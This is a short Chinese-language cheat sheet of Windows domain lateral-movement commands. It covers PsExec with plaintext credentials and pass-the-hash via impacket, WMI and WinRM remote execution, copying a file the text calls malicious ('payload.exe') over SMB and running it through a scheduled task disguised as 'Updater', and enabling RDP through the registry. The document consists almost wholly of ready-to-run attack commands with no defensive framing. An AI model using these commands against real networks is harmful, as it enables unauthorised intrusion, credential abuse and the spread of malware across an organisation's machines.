# 域内横向移动常用方法

## 1. PSEXEC (Windows Sysinternals)

```bash
# 本地明文密码
psexec \\目标IP -u 域\用户名 -p 密码 cmd

# 使用哈希传递 (需要 impacket)
psexec.py -hashes LM:NT 域/用户名@目标IP
```



## 2. WMI (Windows Management Instrumentation)

powershell

```
# 远程执行命令
wmic /node:"目标IP" /user:"域\用户名" /password:"密码" process call create "cmd.exe /c whoami > C:\result.txt"

# PowerShell 版本
Invoke-WmiMethod -ComputerName 目标IP -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe"
```



## 3. WinRM (HTTP/HTTPS 5985/5986)

powershell

```
# 启用 WinRM
Enable-PSRemoting -Force

# 进入远程会话
Enter-PSSession -ComputerName 目标IP -Credential 域\用户名

# 单条命令
Invoke-Command -ComputerName 目标IP -ScriptBlock { Get-Service } -Credential $cred
```



## 4. SMB 共享 + 计划任务

bash

```
# 上传恶意文件
net use \\目标IP\IPC$ 密码 /user:域\用户名
copy payload.exe \\目标IP\C$\Windows\Temp

# 创建计划任务
schtasks /create /S 目标IP /U 域\用户名 /P 密码 /TN "Updater" /SC ONCE /ST 00:00 /TR "C:\Windows\Temp\payload.exe"
```



## 5. 远程桌面 (RDP)

bash

```
# 开启远程桌面 (需要管理员权限)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 添加用户到远程桌面组
net localgroup "Remote Desktop Users" 用户名 /add
```
